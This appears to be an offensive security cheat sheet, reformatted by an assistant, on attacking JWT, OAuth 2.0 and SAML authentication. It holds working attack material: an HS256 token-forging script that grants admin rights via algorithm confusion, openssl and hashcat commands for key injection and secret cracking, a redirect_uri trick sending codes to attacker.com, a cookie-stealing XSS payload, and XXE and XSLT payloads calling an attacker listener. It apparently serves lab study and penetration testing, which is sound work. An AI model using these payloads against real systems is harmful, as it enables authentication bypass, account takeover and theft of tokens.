Here's the fully organized version:

---

## I. JWT (JSON Web Token)

### 1. Signature Stripping & Algorithm Manipulation

**Signature Removal:** Strip the signature (the third part) and see if the server accepts `header.payload.` without validation.

**`"alg": "none"` Attack:** Modify the header to set the algorithm to `none`.

- Format: `{"alg": "none", "typ": "JWT"}`
- Note: Ensure the trailing dot remains (e.g., `header.payload.`).

---

### 2. JWK (JSON Web Key) Header Injection

**Scenario:** Server trusts a key provided inside the token header.

**Step 1 — Generate Malicious RSA Pair:**

```bash
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

**Step 2 — Convert to JWK:** Use CyberChef (PEM to JWK) to convert `exploit_public.pem` to a JSON object.

**Step 3 — Sign in JWT.io:**

1.  In Verify Signature, select RS256 and set format to PEM.
2. Modify Payload (e.g., `"admin": true`).
3. Replace only the `jwk` object details in the Header.
4. Paste `exploit_private.pem` into the private key box.

---

### 3. Cross-Application Token Injection

**Scenario:** Company has `socialA.com` and `socialB.com`.

**Test:** If you have high privileges on A and low on B, try using the JWT from A to access B.

**Check:** Verify if the server fails to validate `aud` (audience) or `iss` (issuer) claims.

---

### 4. Secret Key Brute-Forcing (HS256)

```bash
hashcat -m 16500 jwt.txt ~/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

---

### 5. Key Forgery & Algorithm Confusion (RS256 → HS256)

**Concept:** Recover the RSA public key from multiple JWT signatures, then forge a new token signed with that public key as the HMAC secret.

**Step 1 — Recover the public key:**

```bash
docker run -it sig2n /bin/bash
python3 jwt_forgery.py 'JWT_1' 'JWT_2' 'JWT_3' 'JWT_4'
```

Output: `<id>_65537_x509.pem` and `<id>_65537_pkcs1.pem`

**Step 2 — Forge a signed token (run inside the container):**

```bash
python3 -c "
import hmac, hashlib, base64, json

header  = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'user': 'htb-stdnt','isAdmin': True,'id': 1234,'iat': 1776941298}).encode()).rstrip(b'=')

with open('d7d7aa36b768a612_65537_x509.pem', 'rb') as f:
    key = f.read()

msg = header + b'.' + payload
sig = base64.urlsafe_b64encode(hmac.new(key, msg, hashlib.sha256).digest()).rstrip(b'=')
print((msg + b'.' + sig).decode())
"
```

> If x509 gives 401, retry with `_pkcs1.pem`.

**Step 3 — Use the forged token:** Send it in the `session` cookie (or `Authorization: Bearer`) to the target endpoint.

---

## II. OAuth 2.0

### 1. Redirect URI Manipulation

**Attack:** Change `redirect_uri` to your server (`attacker.com`) to steal the `code` or `token`.

**Bypasses:** Try subdomains (`victim.com.attacker.com`), path traversal (`/../`), or regex flaws.

---

### 2. Cross-Site Token Injection

**Test:** Obtain a token for your account on one site and see if it works to log you into a different site using the same provider.

---

### 3. CSRF via State Parameter

**Flaw:** `state` is missing, static, or unvalidated.

**Attack:** Link an attacker's social identity to a victim's account by sending them a callback URL you generated.

---

### 4. Parameter Injection & XSS

**Test:** Inject payloads into `state`, `client_id`, or `scope`.

**Payloads:**

```
&state=<script>alert(document.cookie)</script>
<img> tags to leak headers
```

---

## III. SAML (Security Assertion Markup Language)

### 1. Signature Exclusion (Stripping)

**Technique:** Intercept the `SAMLResponse`.

**Action:** Delete the entire `<ds:Signature> ... </ds:Signature>` block.

**Test:** Modify the `NameID` to a target user and see if the Service Provider accepts the unsigned assertion.

---

### 2. XML Signature Wrapping (XSW)

1. Capture a valid signed SAML response.
2. Clone the `<saml:Assertion>` block.
3. Modify the first (cloned) assertion: delete the `<ds:Signature>` block and change the user ID.
4. Wrap: paste the malicious assertion before the original signed one.

**Logic:** The server validates the signature on the original but the application processes the first (malicious) assertion.

---

### 3. SAML XXE Injection

**Step 1 — Start a listener:**

```bash
nc -lnvp 8000
```

**Step 2 — Craft the payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[YOUR_IP]:8000"> %xxe; ]>
<samlp:Response> ... </samlp:Response>
```

**Step 3 — Encode and send:**

1. Take your raw XML with the payload.
2. Base64-encode the entire string.
3. URL-encode the resulting Base64 string.
4. Submit via the `SAMLResponse` parameter in a POST request.

**Step 4 — Verify:** If you receive `GET / HTTP/1.1` on your listener, the server is vulnerable.

---

### 4. XSLT Server-Side Injection

**Step 1 — Craft the XSLT payload:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://[YOUR_IP]:8000/')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Step 2 — Injection methods:**

- **Method A (Direct):** Replace the entire `SAMLResponse` with the Base64/URL-encoded payload. The server may error but the connection may still trigger.
- **Method B (Embedded):** Inject the payload inside the `<ds:Transform>` node of a valid SAML response to test if transformation triggers during validation.

**Step 3 — Verify:** Check your listener for a connection. Even an `Access Denied` response with a successful connection confirms the vulnerability.

---

